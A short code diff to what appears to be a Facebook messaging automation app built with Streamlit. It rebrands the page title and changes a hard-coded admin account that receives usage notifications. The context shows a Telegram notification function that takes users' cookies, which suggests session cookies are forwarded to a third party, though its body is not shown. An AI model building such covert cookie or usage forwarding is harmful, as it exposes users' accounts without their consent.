@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE BY RK KRISHNA BRAND",
+    page_title="𝐅𝐁 𝐄𝟐𝐄 𝐁𝐈𝐇𝐀𝐑𝐈 𝐌𝐎𝐃𝐀𝐋",
     page_icon="🫅",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -515,7 +515,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "61573328623221"
+    ADMIN_UID = "61575135835579"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
@@ -533,7 +533,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE BY RK KRISHNA BRAND",
+    page_title="𝐅𝐁 𝐄𝟐𝐄 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐁𝐈𝐇𝐀𝐑𝐈 𝐌𝐎𝐃𝐀𝐋",
     page_icon="🫅",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -1037,7 +1037,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "61573328623221"
+    ADMIN_UID = "61575135835579"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
